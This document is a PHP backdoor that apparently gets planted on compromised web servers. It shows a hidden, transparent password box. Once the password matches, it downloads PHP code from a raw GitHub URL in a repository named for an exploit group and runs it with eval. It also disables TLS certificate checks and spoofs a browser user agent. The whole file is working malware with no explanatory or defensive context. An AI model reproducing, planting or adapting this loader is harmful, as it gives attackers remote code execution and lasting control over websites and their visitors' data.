<?php
session_start();
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION['coly'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coly']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['pass'])) {
    $entered_password = $_POST['pass'];
    $hashed_password = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG'; 
    if (password_verify($entered_password, $hashed_password)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coly'] = 'asu'; 
    }
}

if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/loncat.php');
    eval('?>' . $a);
} else {

    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 0;
                height: 100vh;
                display: flex;
                justify-content: flex-start;
                align-items: flex-end;
            }
            form {
                margin: 10px;
            }
            input {
                border: none;
                outline: none;
                background: transparent;
            }
            input:focus {
                border: none;
            }
            @media (prefers-color-scheme: dark) {
                body { background-color: #000 !important; }
            }
        </style>
    </head>
    <body>
        <form method="POST">
            <input type="password" id="password" name="pass" placeholder="">
        </form>
    </body>
    </html>
    <?php
}
?>
